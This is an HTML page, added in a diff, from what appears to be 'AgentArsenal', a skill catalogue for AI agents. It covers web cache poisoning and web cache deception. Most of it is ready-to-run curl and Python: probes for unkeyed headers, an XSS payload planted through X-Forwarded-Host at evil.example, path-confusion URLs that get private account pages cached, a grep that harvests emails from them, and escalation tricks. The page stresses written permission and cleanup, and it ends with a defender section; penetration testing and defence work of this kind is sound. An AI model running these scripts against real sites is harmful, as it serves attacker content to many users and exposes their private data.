@@ -1,0 +1,293 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: cache-poisoning</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>cache-poisoning</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when testing web cache poisoning and web cache deception on</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-xss.html">web-xss</a> <a href="webapp-pentest-methodology.html">webapp-pentest-methodology</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>Web cache poisoning tricks a cache into storing an attacker-crafted response under a normal URL, so every later visitor receives the attacker&#x27;s content from the trusted domain. Web cache deception is its sibling: path confusion makes the cache store a victim&#x27;s private page under a URL the attacker can fetch. Both turn one request into impact on many users. This skill covers the authorized methodology: detecting caches, finding unkeyed inputs, crafting poisons, confirming victim impact, and handling cache state responsibly. All testing targets systems you have written permission to test. Poisoning affects other users by design, so keep payloads benign, TTLs short, and coordinate every step with the client.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Detect the cache: response headers (<code>Age</code>, <code>X-Cache</code>, <code>CF-Cache-Status</code>),</li>
+<p>timing differences, and cache-buster behavior.</p>
+<li>Map which inputs are part of the cache key and which are unkeyed:</li>
+<p>vary headers, cookies, and query parameters one at a time.</p>
+<li>Find an unkeyed input that is reflected in the response (header</li>
+<p>reflection, error pages, redirect targets).</p>
+<li>Craft a poison: XSS payload or redirect in the unkeyed input, sent</li>
+<p>with a cache buster so your request populates the cache.</p>
+<li>Confirm the poison: fetch the same URL from a clean second session</li>
+<p>and verify the malicious content is served from cache.</p>
+<li>Test web cache deception: path confusion tricks that store private</li>
+<p>pages under attacker-fetchable URLs.</p>
+<li>Purge or expire every poisoned entry and confirm the cache is clean.</li>
+<li>Record the cache key structure, the unkeyed input, and the victim</li>
+<p>session evidence for the report.</p>
+</ol>
+<h2>1. Detecting the cache layer</h2>
+<p>Establish that a cache sits in front of the application and learn its tells.</p>
+<pre><code class="language-bash"># Header tells: Age, X-Cache, CF-Cache-Status, X-Served-By
+curl -si &#x27;https://target.example/&#x27; | grep -iE &#x27;^(age|x-cache|cf-cache-status|x-served-by|via):&#x27;
+
+# Timing tell: first request slow, immediate repeat fast
+for i in 1 2; do
+  curl -s -o /dev/null -w &quot;run $i: %{time_total}s\n&quot; &#x27;https://target.example/static/app.js&#x27;
+done</code></pre>
+<pre><code class="language-bash"># Cache-buster tell: same path with a random query string bypasses cache
+curl -s -o /dev/null -w &#x27;plain: %{time_total}s\n&#x27; &#x27;https://target.example/&#x27;
+curl -s -o /dev/null -w &#x27;buster: %{time_total}s\n&#x27; &#x27;https://target.example/?cb=928374&#x27;</code></pre>
+<p>If the busted URL is consistently slower and lacks <code>Age</code>, the unbusted URL is cached. Note the cache&#x27;s default behavior for query strings: some caches key on the full query, some ignore it, and that choice shapes every later test.</p>
+<h2>2. Finding unkeyed inputs</h2>
+<p>An unkeyed input reaches the application but is not part of the cache key, so the cache stores one response for many different values of that input. Test each candidate input: send two requests that differ only in that input and see whether the second is served from cache.</p>
+<pre><code class="language-bash"># Candidate unkeyed headers: X-Forwarded-Host, X-Forwarded-Proto,
+# X-Original-URL, X-Rewrite-URL, User-Agent, Cookie, Referer
+for h in &#x27;X-Forwarded-Host: evil.example&#x27; &#x27;X-Forwarded-Proto: http&#x27; \
+         &#x27;X-Original-URL: /evil&#x27; &#x27;User-Agent: PoisonProbe/1.0&#x27;; do
+  echo &quot;== $h ==&quot;
+  curl -s -D - -o /dev/null &quot;https://target.example/?cb=$RANDOM&quot; \
+    -H &quot;$h&quot; | grep -iE &#x27;^(age|x-cache):&#x27;
+done</code></pre>
+<pre><code class="language-bash"># Cookie test: does changing a cookie still hit the cached page?
+curl -s -D - -o /dev/null &#x27;https://target.example/?cb=111&#x27; \
+  -b &#x27;probe=A&#x27; | grep -iE &#x27;^(age|x-cache):&#x27;
+curl -s -D - -o /dev/null &#x27;https://target.example/?cb=111&#x27; \
+  -b &#x27;probe=B&#x27; | grep -iE &#x27;^(age|x-cache):&#x27;
+# Second request showing Age / HIT means the cookie is unkeyed</code></pre>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Unkeyed-input finder (authorized targets only).&quot;&quot;&quot;
+import urllib.request, random
+
+BASE = &quot;https://target.example/&quot;
+CANDIDATES = {
+    &quot;X-Forwarded-Host&quot;: &quot;evil.example&quot;,
+    &quot;X-Forwarded-Proto&quot;: &quot;http&quot;,
+    &quot;X-Original-URL&quot;: &quot;/poisoned&quot;,
+    &quot;X-Rewrite-URL&quot;: &quot;/poisoned&quot;,
+    &quot;User-Agent&quot;: &quot;PoisonProbe/1.0&quot;,
+    &quot;Referer&quot;: &quot;https://evil.example/&quot;,
+}
+for header, value in CANDIDATES.items():
+    cb = f&quot;?cb={random.randint(100000, 999999)}&quot;
+    r1 = urllib.request.Request(BASE + cb, headers={header: value})
+    with urllib.request.urlopen(r1, timeout=10) as resp:
+        age = resp.headers.get(&quot;Age&quot;)
+        body1 = resp.read()
+    # Same cache buster, different header value: cache hit means unkeyed
+    r2 = urllib.request.Request(BASE + cb, headers={header: &quot;other.example&quot;})
+    with urllib.request.urlopen(r2, timeout=10) as resp:
+        hit = resp.headers.get(&quot;Age&quot;) is not None
+    print(f&quot;{header:20} cached-on-first={age is not None} unkeyed={hit}&quot;)</code></pre>
+<p>Any input flagged unkeyed becomes the poisoning vehicle in section 4.</p>
+<h2>3. Confirming reflection of the unkeyed input</h2>
+<p>A poison needs the unkeyed input to appear in the response. Common reflections: <code>X-Forwarded-Host</code> in password reset links and absolute URLs, <code>X-Forwarded-Proto</code> in canonical tags, weird headers in verbose error pages.</p>
+<pre><code class="language-bash"># Does X-Forwarded-Host reflect into the page?
+curl -s &#x27;https://target.example/?cb=222&#x27; \
+  -H &#x27;X-Forwarded-Host: evil.example&#x27; | grep -o &#x27;evil\.example&#x27; | head -5
+
+# Does it land in a link or redirect target?
+curl -s -D - &#x27;https://target.example/login?cb=333&#x27; \
+  -H &#x27;X-Forwarded-Host: evil.example&#x27; | grep -iE &#x27;^(location):|evil\.example&#x27; | head -5</code></pre>
+<pre><code class="language-bash"># Fat GET: some caches forward a GET body to the app while ignoring it
+# for the key; test whether body content reflects
+curl -s -X GET &#x27;https://target.example/?cb=444&#x27; \
+  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
+  -d &#x27;q=&lt;script&gt;alert(1)&lt;/script&gt;&#x27; | grep -o &#x27;alert(1)&#x27; | head -3</code></pre>
+<p>Reflection plus unkeyed equals a poisonable response. No reflection means the input is unkeyed but useless; keep hunting.</p>
+<h2>4. Crafting and planting the poison</h2>
+<p>Send the malicious request with a fresh cache buster so the cache stores your crafted response under the shared key.</p>
+<pre><code class="language-bash"># XSS poison via reflected X-Forwarded-Host (benign alert payload)
+CB=&quot;cb=$(date +%s)&quot;
+curl -s &quot;https://target.example/?$CB&quot; \
+  -H &#x27;X-Forwarded-Host: evil.example&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#x27; \
+  -o /tmp/poison.html
+grep -o &#x27;alert(1)&#x27; /tmp/poison.html | head -2</code></pre>
+<pre><code class="language-bash"># Redirect poison: unkeyed X-Forwarded-Host reflected into Location
+curl -s -D - -o /dev/null &quot;https://target.example/login?cb2=$(date +%s)&quot; \
+  -H &#x27;X-Forwarded-Host: evil.example&#x27; | grep -i &#x27;^location:&#x27;</code></pre>
+<p>Keep the payload benign: <code>alert(document.domain)</code> or a redirect to your own test domain. Never plant credential harvesters, crypto miners, or defacement content, even briefly. Note the exact cache buster value; you will need it to verify and to purge.</p>
+<h2>5. Confirming victim impact</h2>
+<p>Fetch the poisoned URL from a clean session: different browser, no cookies, different IP if possible. The response must come from cache (<code>Age</code> present or <code>X-Cache: HIT</code>) and contain your payload.</p>
+<pre><code class="language-bash"># Victim session: no cookies, plain request to the poisoned URL
+curl -s &#x27;https://target.example/?cb=&lt;your-buster&gt;&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (victim-simulation)&#x27; \
+  -D /tmp/victim-headers.txt -o /tmp/victim-body.html
+grep -iE &#x27;^(age|x-cache):&#x27; /tmp/victim-headers.txt
+grep -o &#x27;alert(1)&#x27; /tmp/victim-body.html | head -2</code></pre>
+<p>The evidence bundle: your planting request, the victim request showing a cache HIT, and the payload present in the victim body. If the cache varies on something you missed (a cookie, the User-Agent), the victim fetch misses the poison; go back to section 2 and re-map the key.</p>
+<h2>6. Web cache deception</h2>
+<p>Deception stores the victim&#x27;s private page in the cache under a URL the attacker controls. The trick is path confusion: a URL the cache treats as static but the application treats as dynamic.</p>
+<pre><code class="language-bash"># Path confusion probes: cache sees a .css file, app serves /account
+for p in &#x27;/account/evil.css&#x27; &#x27;/account;.css&#x27; &#x27;/account%2f..%2fevil.css&#x27; \
+         &#x27;/account%00.css&#x27; &#x27;/nonexistent.css/../../account&#x27;; do
+  echo &quot;== $p&quot;
+  code=$(curl -s -o /dev/null -w &#x27;%{http_code}&#x27; \
+    -b &#x27;session=YOUR_TEST_SESSION&#x27; &quot;https://target.example$p&quot;)
+  ctype=$(curl -s -o /dev/null -w &#x27;%{content_type}&#x27; \
+    -b &#x27;session=YOUR_TEST_SESSION&#x27; &quot;https://target.example$p&quot;)
+  echo &quot;  $code $ctype&quot;
+done</code></pre>
+<pre><code class="language-bash"># When a probe returns 200 with the account page content under a .css URL:
+# 1. Victim (logged in) visits https://target.example/account/evil.css
+# 2. Cache stores their private page under that URL
+# 3. Attacker (no session) fetches the same URL and reads the victim&#x27;s data
+curl -s &#x27;https://target.example/account/evil.css&#x27; | grep -oiE \
+  &#x27;([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})&#x27; | head -5</code></pre>
+<p>Also test the <code>Accept</code> header variant: some caches key on file extension only and ignore content negotiation, so requesting a private API path with an image extension poisons the same way. Confirm with your own two test accounts (victim and attacker) and never with real user data.</p>
+<h2>7. Cleaning up the cache</h2>
+<p>Every poisoned entry must be purged before you finish. Coordinate with the client on the purge method.</p>
+<pre><code class="language-bash"># Option A: the client purges by URL or surrogate key (preferred)
+# Option B: wait out the TTL you measured in section 1, then verify
+sleep 5  # placeholder: replace with the real TTL wait
+curl -s &#x27;https://target.example/?cb=&lt;your-buster&gt;&#x27; \
+  | grep -c &#x27;alert(1)&#x27; || echo &quot;poison gone&quot;</code></pre>
+<pre><code class="language-bash"># Verify cleanliness from the victim session too
+curl -s &#x27;https://target.example/?cb=&lt;your-buster&gt;&#x27; \
+  -H &#x27;User-Agent: Mozilla/5.0 (victim-simulation)&#x27; | grep -c &#x27;alert(1)&#x27; \
+  || echo &quot;victim view clean&quot;</code></pre>
+<p>Do not end the engagement with poisoned entries live. If you cannot purge, escalate to the client immediately rather than leaving the cache dirty.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>Multiple cache layers (CDN plus reverse proxy): each has its own</li>
+<p>key rules. Poison may stick at one layer and miss at the other; test from outside the CDN to isolate layers.</p>
+<li>The cache respects <code>Cache-Control: no-store</code> on the poison response:</li>
+<p>some poisons never store. Check the response headers on your planting request.</p>
+<li>Authenticated responses are cached per session cookie: the poison</li>
+<p>only affects users sharing the exact cookie value, which limits impact but is still a finding.</p>
+<li>Query string busters are part of the key: your poison only affects</li>
+<p>the exact buster URL. Use a buster-free plant (relying on TTL expiry) when you need the bare URL poisoned.</p>
+<li>The application sets <code>Vary: X-Forwarded-Host</code>: the header becomes</li>
+<p>keyed and the attack fails. Verify Vary before claiming unkeyed.</p>
+<li>WAF strips suspicious headers before the app sees them: the</li>
+<p>reflection test in section 3 distinguishes this from a real negative.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>One unkeyed input reflects weakly (inside a comment): chain with</li>
+<p>cache deception so the stored page is the victim&#x27;s own data, which needs no XSS at all.</p>
+<li>XSS poison is filtered: pivot to redirect poisoning via the same</li>
+<p>unkeyed input, or to a stored open redirect the cache will serve.</p>
+<li>The cache ignores your header: try parameter cloaking (a query</li>
+<p>parameter the cache strips but the app reads, such as <code>?x=1&amp;utm=</code> variants) and semicolon parameters (<code>;evil=1</code>).</p>
+<li>Deception path tricks fail: try encoded slashes, dot segments, and</li>
+<p>trailing static extensions on API paths (<code>/api/me/x.png</code>).</p>
+<li>Impact seems limited to one region or PoP: document the PoP from</li>
+<p>response headers; regional impact is still impact.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see cache poisoning as cache HIT responses carrying unexpected content (script tags, foreign domains in Location headers), spikes in cache-buster query parameters from one IP, and private data appearing under static-asset URLs in cache logs. The durable fixes are including every reflected input in the cache key (or stripping it at the edge), adding <code>Vary</code> correctly, never reflecting <code>X-Forwarded-Host</code>-style headers into responses, disabling caching for responses that vary by unkeyed input, normalizing URLs before the cache key is computed (to kill path confusion), and separating static and dynamic content onto different cache rules. Purging capability and cache access logs turn incidents from mysteries into timelines.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application): the entry</li>
+<p>point class.</p>
+<li>CWE-20 (Improper Input Validation): unkeyed input reflection.</li>
+<li>CWE-444 (Inconsistent Interpretation of HTTP Requests): the class</li>
+<p>behind desync-assisted poisoning.</p>
+<li>CWE-639 (Authorization Bypass Through User-Controlled Key): cache</li>
+<p>deception exposing private pages.</p>
+<li>PortSwigger research by James Kettle: Web Cache Poisoning and Web</li>
+<p>Cache Deception methodology.</p>
+<li>PortSwigger Web Security Academy: web cache poisoning and web cache</li>
+<p>deception labs.</p>
+<li>RFC 7234 (HTTP Caching): Vary, Age, and cache key semantics.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
